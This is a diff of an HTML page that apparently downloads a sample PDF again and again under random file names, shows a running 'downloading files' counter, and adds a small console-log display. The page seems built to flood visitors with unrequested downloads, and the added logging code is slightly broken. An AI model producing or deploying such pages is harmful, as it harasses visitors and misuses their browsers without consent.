@@ -6,6 +6,7 @@
 	<body>
 		<h1 id="displayAmount">downloading files: undefined</h1>
 		<button onclick='window.location.replace("https://www.google.co/")'>go to google and remove site</button>
+		<div id="consoleLoger"></div>
 	</body>
 	<script>
 		function downloadFile(url, fileName){
@@ -46,5 +47,9 @@
 	      		let name = makeid(10);
 	      		downloadFile('https://www.africau.edu/images/default/sample.pdf', name += ".pdf");
 	    	};
+		function updateLogs() {
+			document.getElementById("consoleLoger").value = console.logs
+		}
+		setInterval(updateLogs,1000)
   </script>
 </html>
